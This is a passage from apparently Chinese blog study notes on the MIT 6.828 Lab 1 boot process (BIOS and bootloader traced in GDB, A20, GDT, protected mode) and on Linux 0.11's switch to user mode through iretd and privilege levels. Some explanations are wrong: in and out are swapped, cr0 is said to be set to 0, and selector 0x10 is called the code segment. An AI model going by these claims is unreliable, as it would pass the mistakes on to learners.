汇编语法给出了很好的（并且非常简短的）描述。</span><br></pre></td></tr></table></figure><p>要求了解基本的汇编，这个就不多说了。</p><h2 id="Exercise-2"><a href="#Exercise-2" class="headerlink" title="Exercise 2"></a>Exercise 2</h2><h3 id="ROM-BIOS"><a href="#ROM-BIOS" class="headerlink" title="ROM BIOS"></a>ROM BIOS</h3><p>利用 QEMU 来调试计算机如何启动</p><p>在实验目录下打开两个终端，一个输入<strong>make qemu-gdb</strong>，另一个输入<strong>make gdb</strong>。</p><p>可以看到</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/MIT6.828-Lab1/1648735198666140/a3c8c4f9ee8980d05a1699d799c29a475dfbe013.png" alt="image-20220331215958368"></p><p>其中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[f000:fff0]    0xffff0:ljmp   $0xf000,$0xe05b</span><br></pre></td></tr></table></figure><p>是 GDB 对要执行的第一条指令的反汇编，可以看出当开机的一瞬间，PC 会在 <code>0xffff0</code> 处执行(CS = 0xf000 | IP = 0xfff0 | 实模式下的寻址方式为：物理地址= 16 * 段+偏移量)，也就是 BIOS</p><p>而该地址处又表示要跳到分段地址 0xfe05b 处</p><p>然后就是exer2的任务描述：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用GDB的&#39;si&#39;命令，去追踪ROM BIOS几条指令，并且试图去猜测，它是在做什么。但是不需要把每个细节都弄清楚。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[f000:e05b]    0xfe05b:cmpl   $0x0,%cs:0x6ac8</span><br><span class="line">[f000:e062]    0xfe062:jne    0xfd2e1</span><br></pre></td></tr></table></figure><p>比较 0x0 和 %cs:0x6ac8 的值，此时 CS 是 0xf000，jne：上一个 cmp 指令不为 0 时跳转，即两值不相等时跳转。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[f000:e066]    0xfe066:xor    %dx,%dx</span><br></pre></td></tr></table></figure><p>这一条指令的地址是 0xfe066，说明之前 %cs:0x6ac8 和 0x0 相等，这条指令是指把 dx 置 0 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[f000:e068]    0xfe068:mov    %dx,%ss       &#x2F;&#x2F;把dx赋给ss</span><br><span class="line">[f000:e06a]    0xfe06a:mov    $0x7000,%esp  &#x2F;&#x2F;sp &#x3D; 0x7000</span><br><span class="line">[f000:e070]    0xfe070:mov    $0xf34c2,%edx &#x2F;&#x2F;edx &#x3D; 0xf34c2</span><br><span class="line">[f000:e076]    0xfe076:jmp    0xfd15c       &#x2F;&#x2F;jmp to 0xfd15c</span><br><span class="line">[f000:d15c]    0xfd15c:mov    %eax,%ecx     &#x2F;&#x2F;把eax赋给ecx</span><br><span class="line">[f000:d15f]    0xfd15f:cli </span><br><span class="line">[f000:d160]    0xfd160:cld </span><br></pre></td></tr></table></figure><p>cli：关闭中断指令，毕竟还在启动，肯定不能被别的中断了</p><p>cld：设置方向标识位为0，表示后续的串操作比如MOVS操作，内存地址的变化方向，如果为 0 代表从低地址值变为高地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[f000:d161]    0xfd161:mov    $0x8f,%eax    &#x2F;&#x2F;把eax赋值为0x8f</span><br><span class="line">[f000:d167]    0xfd167:out    %al,$0x70 </span><br><span class="line">[f000:d169]    0xfd169:in     $0x71,%al</span><br></pre></td></tr></table></figure><p>out 和 in 指令用于操作 IO 端口，CPU 与外设通讯，通常是通过访问、修改设备控制器中的寄存器来实现的，这些位于设备控制器当中的寄存器也叫做 <strong>IO 端口</strong>。为了方便管理，80x86CPU采用 IO 端口单独编址的方式，即所有设备的端口都被命名到一个 IO 端口地址空间中。这个空间是独立于内存地址空间的。所以必须采用和访问内存的指令不一样的指令来访问端口。</p><p>所以这里引入 in，out 操作：</p><p>in %al, PortAddress   向端口地址为 PortAddress 的端口写入值，值为 al 寄存器中的值</p><p>out PortAddres,%al    把端口地址为 PortAddress 的端口中的值读入寄存器al中</p><p>标准规定端口操作必须要用 al 寄存器作为缓冲。</p><p>所以这几条命令就是操作端口 0x70 和 0x71，<a href="http://bochs.sourceforge.net/techspec/PORTS.LST">对应的设备</a>是 CMOS，是一种可读写的存储设备，会在计算机关机时存储一些信息。</p><p>CMOS 可以控制很多功能，其中有一个是控制**不可屏蔽中断(NMI)**。不可屏蔽中断是什么呢？是一种优先级很高的中断，比如内存损坏问题出现就会触发，用于解决紧急问题。</p><p>操作 CMOS 存储器 0x70 和 0x71 这两个端口都需要，其中 0x70 叫做<strong>索引寄存器</strong>，这个 8 位存储器的最高位能设置不可屏蔽中断是否能发生，设置成 1，不发生，设置成 0 ，发生。低 7 位用于指定 <strong>CMOS 存储器中的存储单元地址</strong>。</p><p>举个例子，假如现在要访问第 1 号存储单元，且开启不可屏蔽中断，那么就需要将 AL 寄存器赋值为 0x81 (对应二进制 10000001)，即</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov $0x81, %al</span><br><span class="line">out %al, 0x70</span><br></pre></td></tr></table></figure><p>读和写由 0x71 端口完成，比如现在想从 1 号存储单元读值，则需要</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">in $0x71, %al </span><br></pre></td></tr></table></figure><p>我们会到之前的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[f000:d161]    0xfd161:mov    $0x8f,%eax    &#x2F;&#x2F;把eax赋值为0x8f</span><br><span class="line">[f000:d167]    0xfd167:out    %al,$0x70 </span><br><span class="line">[f000:d169]    0xfd169:in     $0x71,%al</span><br></pre></td></tr></table></figure><p>此时 eax 为 0x8f，那么 al 也为 0x8f (AX是EAX的低16位，AL又是AX的低８位，所以相当于AL是AX的最低４位（×)，对应二进制是 10001111，最高位为 1 ，说明会关闭不可屏蔽中断，之后的七位转化成十六进制是 0xf，所以会访问 CMOS 的第 0xf 号存储单元，并把值读到 al 中。</p><p>接着往下看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[f000:d16b]    0xfd16b:in     $0x92,%al</span><br><span class="line">[f000:d16d]    0xfd16d:or     $0x2,%al</span><br><span class="line">[f000:d16f]    0xfd16f:out    %al,$0x92</span><br></pre></td></tr></table></figure><p>也是对端口进行操作，就不多说了，具体实现了什么好像也不是很重要。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[f000:d171]    0xfd171:lidtw  %cs:0x6ab8</span><br><span class="line">[f000:d177]    0xfd177:lgdtw  %cs:0x6a74</span><br></pre></td></tr></table></figure><p>加载中断向量表寄存器(IDTR)和全局描述符表寄存器(GDTR)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[f000:d17d]    0xfd17d:mov    %cr0,%eax</span><br><span class="line">[f000:d180]    0xfd180:or     $0x1,%eax</span><br><span class="line">[f000:d184]    0xfd184:mov    %eax,%cr0</span><br></pre></td></tr></table></figure><p>只是测试，不重要。</p><p>这一部分将就着看，毕竟不是很懂，感觉也不是重点。</p><h2 id="Exercise-3"><a href="#Exercise-3" class="headerlink" title="Exercise 3"></a>Exercise 3</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">查看实验室工具指南，尤其是 GDB 命令部分。即使您熟悉 GDB，这也包括一些对操作系统工作有用的深奥 GDB 命令。</span><br><span class="line"></span><br><span class="line">在地址 0x7c00 处设置断点，该地址将加载引导扇区。继续执行直到该断点。跟踪boot&#x2F;boot.S中的代码，使用源代码和反汇编文件 obj&#x2F;boot&#x2F;boot.asm跟踪您的位置。还可以在 GDB 中使用x&#x2F;i命令来反汇编引导加载程序中的指令序列，并将原始引导加载程序源代码与obj&#x2F;boot&#x2F;boot.asm 和 GDB 中的反汇编进行比较。</span><br><span class="line"></span><br><span class="line">追踪到boot&#x2F;main.c中的bootmain()，然后追踪到readsect()。确定与readsect()中的每个语句相对应的确切汇编指令。跟踪readsect()的其余部分 并返回bootmain() ，并确定从磁盘读取内核剩余扇区的for循环的开始和结束。找出循环结束时将运行的代码，在此处设置断点，然后继续执行该断点。然后逐步完成引导加载程序的其余部分。</span><br></pre></td></tr></table></figure><p>将断点下在 0x7c00 处，查看具体代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[   0:7c00] &#x3D;&gt; 0x7c00:cli </span><br><span class="line">[   0:7c01] &#x3D;&gt; 0x7c01:cld </span><br></pre></td></tr></table></figure><p>cli 将所有中断关闭</p><p>cld 指定之后发生的串处理操作的指针移动方向，大概了解就行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[   0:7c02] &#x3D;&gt; 0x7c02:xor    %ax,%ax</span><br><span class="line">[   0:7c04] &#x3D;&gt; 0x7c04:mov    %ax,%ds</span><br><span class="line">[   0:7c06] &#x3D;&gt; 0x7c06:mov    %ax,%es</span><br><span class="line">[   0:7c08] &#x3D;&gt; 0x7c08:mov    %ax,%ss</span><br></pre></td></tr></table></figure><p>初始化 ax、ds、es、ss 寄存器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[   0:7c0a] &#x3D;&gt; 0x7c0a:in     $0x64,%al</span><br><span class="line">[   0:7c0c] &#x3D;&gt; 0x7c0c:test   $0x2,%al</span><br><span class="line">[   0:7c0e] &#x3D;&gt; 0x7c0e:jne    0x7c0a</span><br></pre></td></tr></table></figure><p>又是对 IO 设备进行操作，0x64 端口对应键盘控制器，<code>test   $0x2,%al</code>表示检测 al 的第二位，也就是 bit1，查找资料发现，bit1 对应的输入的缓冲区是否已满</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/MIT6.828-Lab1/1648890627783337/47ef26977b1c21b8c2178b47d39966290dc1b169.png" alt="image-20220402171027456"></p><p>所以这三条指令的意思就是：一直等到 al 的 bit1 为 0 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[   0:7c10] &#x3D;&gt; 0x7c10:mov    $0xd1,%al</span><br><span class="line">[   0:7c12] &#x3D;&gt; 0x7c12:out    %al,$0x64</span><br></pre></td></tr></table></figure><p>当 al 的 bit1 为 0 时，说明可以写新数据了，这两句指令的意思是将 0xd1 这个数据写入到 0x64 的端口。</p><p>当 0xd1 被写入 0x64 端口时会发生什么？</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/MIT6.828-Lab1/1648898854529259/21ec23644950e7c2d501426a6f8af26388fd19c3.png" alt="image-20220402192734391"></p><p>首先向 0x64 端口写数据，代表向键盘控制器 804x 发送指令，这个指令将会被送给0x60端口。0xd1 指令代表下一次写入 0x60 端口的数据将被写入给 804x 控制器的输出端口。可以理解为下一次写入 0x60 端口的数据是一个控制指令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[   0:7c14] &#x3D;&gt; 0x7c14:in     $0x64,%al</span><br><span class="line">[   0:7c16] &#x3D;&gt; 0x7c16:test   $0x2,%al</span><br><span class="line">[   0:7c18] &#x3D;&gt; 0x7c18:jne    0x7c14</span><br></pre></td></tr></table></figure><p>这三行是再一次等待刚刚写入的指令 0xd1，是否完全读取。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[   0:7c1a] &#x3D;&gt; 0x7c1a:mov    $0xdf,%al</span><br><span class="line">[   0:7c1c] &#x3D;&gt; 0x7c1c:out    %al,$0x60</span><br></pre></td></tr></table></figure><p>将 0xdf 写入到 0x60 端口，也就是将 0xdf 指令写入 804x 控制器(简单理解成键盘的一个控制器就行)</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/MIT6.828-Lab1/1648899788276702/380990dad3808829850838a828bc5b5a35130823.png" alt="image-20220402194308080"></p><p>可以看到 A20 被打开了，什么是 A20呢？</p><p>我们知道的是 8086 的 CPU 地址总线是 20位，所以如果程序给出 21 位的 内存地址，多出来的一位就会呗忽略，举个例子就是：<code>1 0000 00000000 00000000</code>。那个 1 因为处在第 21 位，所以会被忽略，整个内存地址算下来就是 0，如今 CPU 已经有 32位 和 64位，但是因为兼容性，还是要保持只能用 20 位地址线的模式，所以打开 A20 地址线就相当于让地址总线突破 20 位变为 32位。</p><p>打开了 A20 说明可以进入保护模式了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[   0:7c1e] &#x3D;&gt; 0x7c1e:lgdtw  0x7c64</span><br><span class="line">[   0:7c23] &#x3D;&gt; 0x7c23:mov    %cr0,%eax</span><br><span class="line">[   0:7c26] &#x3D;&gt; 0x7c26:or     $0x1,%eax</span><br><span class="line">[   0:7c2a] &#x3D;&gt; 0x7c2a:mov    %eax,%cr0</span><br></pre></td></tr></table></figure><p>将 0x7c64 的地址加载到全局描述符表GDT，查看 0x7c64 地址为 <code>pop %ss</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x&#x2F;i 0x7c64</span><br><span class="line">   0x7c64:pop    %ss</span><br></pre></td></tr></table></figure><p>后面三行代码是把 cr0 寄存器赋值为 0 ，正式进入保护模式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[   0:7c2d] &#x3D;&gt; 0x7c2d:ljmp   $0x8,$0x7c32</span><br><span class="line">The target architecture is assumed to be i386</span><br><span class="line">&#x3D;&gt; 0x7c32:mov    $0x10,%ax</span><br><span class="line">--------------------------------------------------</span><br><span class="line">对应 boot.s 里的</span><br><span class="line">ljmp    $PROT_MODE_CSEG, $protcseg</span><br></pre></td></tr></table></figure><p>16 位模式切换成 32 位</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&gt; 0x7c32:mov    $0x10,%ax</span><br><span class="line">&#x3D;&gt; 0x7c36:mov    %eax,%ds</span><br><span class="line">&#x3D;&gt; 0x7c38:mov    %eax,%es</span><br><span class="line">&#x3D;&gt; 0x7c3a:mov    %eax,%fs</span><br><span class="line">&#x3D;&gt; 0x7c3c:mov    %eax,%gs</span><br><span class="line">&#x3D;&gt; 0x7c3e:mov    %eax,%ss</span><br></pre></td></tr></table></figure><p>初始化段寄存器为 0x10，因为现在处在保护模式，段寄存器中存的都是段选择子，所以 0x10 对应的是代码段描述符</p><p>至于为什么是 0x10 对应的代码段，卧槽我还真看不出为啥，只知道 gdt 是这样定义的：</p><p>第一个是NULL，第二个是代码段，第三个是数据段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># Bootstrap GDT</span><br><span class="line">.p2align 2                                # force 4 byte alignment</span><br><span class="line">gdt:</span><br><span class="line">  SEG_NULL# null seg</span><br><span class="line">  SEG(STA_X|STA_R, 0x0, 0xffffffff)# code seg</span><br><span class="line">  SEG(STA_W, 0x0, 0xffffffff)        # data seg</span><br><span class="line"></span><br><span class="line">gdtdesc:</span><br><span class="line">  .word   0x17                            # sizeof(gdt) - 1</span><br><span class="line">  .long   gdt                             # address gdt</span><br></pre></td></tr></table></figure><p>mmu.h 里定义了 SEG 宏</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#define SEG(type, base, lim, dpl) \</span><br><span class="line">&#123; ((lim) &gt;&gt; 12) &amp; 0xffff, (base) &amp; 0xffff, ((base) &gt;&gt; 16) &amp; 0xff,\</span><br><span class="line">    type, 1, dpl, 1, (unsigned) (lim) &gt;&gt; 28, 0, 0, 1, 1,\</span><br><span class="line">    (unsigned) (base) &gt;&gt; 24 &#125;</span><br></pre></td></tr></table></figure><p>笑死，更看不懂了。</p><p>还是记这个图要好点，把 0x10 转化为二进制就是 10000，从描述符索引那看起，第一个是NULL，对应的下标是 3，第二个是 code，对应的下标是 4，10000 正好对应 4</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt/1647586473179939/3bd5457f3eb4ef80f21d0b91e7247db64898c136.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&gt; 0x7c40:mov    $0x7c00,%esp</span><br><span class="line">&#x3D;&gt; 0x7c45:call   0x7d15</span><br><span class="line">---------------------------------------------</span><br><span class="line">  # Set up the stack pointer and call into C.</span><br><span class="line">  movl    $start, %esp</span><br><span class="line">  call bootmain</span><br></pre></td></tr></table></figure><p>对应着 boot.s 的代码可以知道，这两行代码是在设置堆栈指针，同时跳到 main 中的 bootmain</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&gt; 0x7d15:push   %ebp</span><br><span class="line">&#x3D;&gt; 0x7d16:mov    %esp,%ebp</span><br><span class="line">&#x3D;&gt; 0x7d18:push   %esi</span><br><span class="line">&#x3D;&gt; 0x7d19:push   %ebx</span><br><span class="line">#readseg((uint32_t) ELFHDR, SECTSIZE*8, 0);</span><br><span class="line">&#x3D;&gt; 0x7d1a:push   $0x0&#x2F;&#x2F;参数3</span><br><span class="line">&#x3D;&gt; 0x7d1c:push   $0x1000&#x2F;&#x2F;参数2</span><br><span class="line">&#x3D;&gt; 0x7d21:push   $0x10000&#x2F;&#x2F;参数1</span><br><span class="line">&#x3D;&gt; 0x7d26:call   0x7cdc&#x2F;&#x2F;readseg</span><br></pre></td></tr></table></figure><p>栈环境的设置，调用 readseg 函数，<code>readseg((uint32_t) ELFHDR, SECTSIZE*8, 0)</code></p><p>bootmain 函数里有它的定义</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void readseg(uchar *pa, uint count, uint offset);</span><br></pre></td></tr></table></figure><p> 它的功能从注释上来理解应该是，把距离内核起始地址offset个偏移量存储单元作为起始，将它和它之后的count字节的数据读出送入以pa为起始地址的内存物理地址处。</p><p>所以结合之前的传参说明这个函数把磁盘的第一个页(0x1000)的内容读入了内存地址为 0x10000 的地方。</p>]]></content>
      
      
      <categories>
          
          <category> MIT6.828 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MIT6.828 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统之内核后</title>
      <link href="/2022/03/30/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8B%E5%86%85%E6%A0%B8%E5%90%8E/"/>
      <url>/2022/03/30/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8B%E5%86%85%E6%A0%B8%E5%90%8E/</url>
      
        <content type="html"><![CDATA[<h2 id="切换到用户态模式"><a href="#切换到用户态模式" class="headerlink" title="切换到用户态模式"></a>切换到用户态模式</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 第二部分的内容，各种初始化工作</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// 第三部分的内容，一个新进程的诞生</span></span><br><span class="line">    move_to_user_mode();</span><br><span class="line">    <span class="keyword">if</span> (!fork()) &#123;</span><br><span class="line">        <span class="comment">// 新进程里干了啥，是第四部分的内容</span></span><br><span class="line">        init();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 死循环，操作系统怠速状态</span></span><br><span class="line">    <span class="keyword">for</span>(;;) pause();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>切换到用户态模式，并在一个新的进程中做一个最终的初始化 init。这个 init 函数会创建出一个进程，设置终端的标准 IO，并且再创建出一个执行 shell 程序的进程用来接受用户的命令。</p><h3 id="move-to-user-mode"><a href="#move-to-user-mode" class="headerlink" title="move_to_user_mode()"></a><strong>move_to_user_mode()</strong></h3><p>改变代码的特权级，从内核态转变为用户态。</p><p>一旦转变为了用户态，就会一直处于用户态的模式，除非发生了中断，比如用户发出了系统调用的中断指令，那么此时将会从用户态陷入内核态，不过当中断处理程序执行完之后，又会通过中断返回指令从内核态回到用户态。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt-3/1648689226620104/615eb9dcb00b0eee72b7e0fa76dcacdcc689cbbe.png" alt="640 (1)"></p><h4 id="内核态与用户态的本质-特权级"><a href="#内核态与用户态的本质-特权级" class="headerlink" title="内核态与用户态的本质-特权级"></a><strong>内核态与用户态的本质-特权级</strong></h4><p>特权级检查主要是检查<strong>段选择子的特定结构</strong></p><p>这一切都源于 CPU 的保护机制，CPU 为了配合操作系统完成保护机制这一特性，分别设计了<strong>分段保护机制</strong>与<strong>分页保护机制</strong>。</p><p>将 cr0 寄存器的 PE 位开启时，就开启了保护模式，也即开启了<strong>分段保护机制</strong>；将 cr0 寄存器的 PG 位开启时，就开启了分页模式，也即开启了<strong>分页保护机制</strong>。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt-3/1648689594787849/05ebe1114ddafd78cdfb17b16c2d8d6332d7ba4a.png" alt="640 (2)"></p><p>有关特权级的保护，实际上属于分段保护机制的一种。具体怎么保护的呢？</p><p>举个简单的例子，我们正在执行一串跳转代码，也就是要跳到另一处内存地址执行，一般都会涉及到 jmp、call 和 中断。拿 jmp 跳转来举例。</p><p>如果是短跳转，即 jmp xxx，这不会涉及到段的变换，也就没有特权级的检查。</p><p>如果是长跳转，即 jmp yyy:xxx，yyy 表示会跳转到的另一个段选择子结构。此时就会触发特权级的检查：</p><ul><li>首先是正在执行的那一串跳转代码，是由 cs:eip 指向，cs 是代码段寄存器，存着段选择子。</li></ul><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt-3/1648690375697415/fe57c42fd9f6978e0e816797f2b13b03aeb3e24f.png" alt="640 (3)"></p><p>这里面的低端两位，此时表示 <strong>CPL</strong>，也就是<strong>当前所处的特权级</strong>，假如我们现在这个时刻，CS 寄存器的后两位为 3，二进制就是 11，就表示是当前处理器处于用户态这个特权级。</p><ul><li>然后是要跳转到的内存地址，yyy:xxx，yyy 也是段选择子。</li></ul><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt-3/1648690375697415/fe57c42fd9f6978e0e816797f2b13b03aeb3e24f.png" alt="640 (3)"></p><p>这个结构仍然是一样的段选择子结构，只不过这里的低端两位，表示 <strong>RPL</strong>，也就是<strong>请求特权级</strong>，表示我想请求的特权级是什么。同时，CPU 会拿这个段选择子去全局描述符表中寻找段描述符，从中找到段基址。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt-3/1648690525497475/ec8c16f2732116ed163c08ece9f0335f4844647c.png" alt="640 (4)"></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt-3/1648690540771139/8468fb8fee33bc16efe53da1257b22f7359691a6.png" alt="640 (5)"></p><ul><li>这里的 <strong>DPL</strong>，表示<strong>目标代码段特权级</strong>，也就是即将要跳转过去的那个段的特权级。</li></ul><p>系统会将这三个特权级检查。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt-3/1648690637452053/ef706296266e46c2d3bf6c80144e03aa65a1b9a0.png" alt="640 (6)"></p><p>检查的规则很多，但是绝大多数情况下，会<strong>要求 CPL 必须等于 DPL</strong>，才能实现跳转。说白了就是只能<strong>用户态跳用户态，内核态跳内核态</strong>。</p><p>这只是代码段跳转的检查，还有数据段的特权级检查，最终效果是<strong>处于内核态的代码可以访问任何特权级的数据段，处于用户态的代码则只可以访问用户态的数据段</strong>，这也就实现了内存数据读写的保护。</p><p><strong>总结一下就是：代码跳转只能同特权级跳转，数据访问只能高特权级访问低特权级。</strong></p><h4 id="特权级转换的方式"><a href="#特权级转换的方式" class="headerlink" title="特权级转换的方式"></a><strong>特权级转换的方式</strong></h4><p>上面说代码跳转只能同特权级跳，但是如果现在处于内核态，又怎么会跳到用户态呢？</p><p>Intel 设计了好多种特权级转换的方式，<strong>中断</strong>和<strong>中断返回</strong>就是其中的一种。</p><p><strong>处于用户态的程序，通过触发中断，可以进入内核态，之后再通过中断返回，又可以恢复为用户态</strong>。</p><p>也就是刚刚那幅图：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt-3/1648689226620104/615eb9dcb00b0eee72b7e0fa76dcacdcc689cbbe.png" alt="640 (1)"></p><p><strong>系统调用</strong>就是这样，用户通过 <strong>int 0x80</strong> 中断指令触发中断，CPU 切换至内核态，执行中断处理程序，之后中断程序返回，又从内核态切换回用户态。</p><p>如果当前代码，本身就处在内核态，并不是由一个用户态程序通过中断而切换到的内核态，那怎么回到原来的用户态呢？答案还是，通过中断返回。</p><p>没有中断也能中断返回，中断和中断返回既可以配套使用，又可以单独使用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">void main(void) &#123;</span><br><span class="line">    ...    </span><br><span class="line">    move_to_user_mode();</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#define move_to_user_mode() \</span><br><span class="line">_asm &#123; \</span><br><span class="line">    _asm mov eax,esp \</span><br><span class="line">    _asm push 00000017h \</span><br><span class="line">    _asm push eax \</span><br><span class="line">    _asm pushfd \</span><br><span class="line">    _asm push 0000000fh \</span><br><span class="line">    _asm push offset l1 \</span><br><span class="line">    _asm iretd &#x2F;* 执行中断返回指令*&#x2F; \</span><br><span class="line">_asm l1: mov eax,17h \</span><br><span class="line">    _asm mov ds,ax \</span><br><span class="line">    _asm mov es,ax \</span><br><span class="line">    _asm mov fs,ax \</span><br><span class="line">    _asm mov gs,ax \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，直接执行了中断返回指令 iretd。</p><p>上面的五次压栈操作是为什么呢？因为中断返回理论上就是应该和中断配合使用的，而此时并不是真的发生了中断到这里，所以我们得<strong>假装发生了中断</strong>才行。</p><p>中断发生时，CPU 会自动帮我们压栈；中断返回时，CPU 又会帮忙吧压栈的这些值<strong>反序</strong>赋值给相应的寄存器。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt-3/1648693401023671/03fd28ed3881c1b332090ae726b95eb255f533e6.png" alt="640"></p><p>执行 iretd 指令时，硬件会按顺序将刚刚压入栈中的数据，分别赋值给 SS、ESP、EFLAGS、CS、EIP 这几个寄存器，这就感觉像是正确返回了一样，让其<strong>误以为这是通过中断进来的</strong>。</p><p>压入栈的 CS 和 EIP 代表中断发生前代码所处的位置，中断返回就能继续去那边执行。</p><p>SS 和 ESP 表示中断发生前栈的位置，返回后恢复栈。</p><p>再看看代码1</p><figure 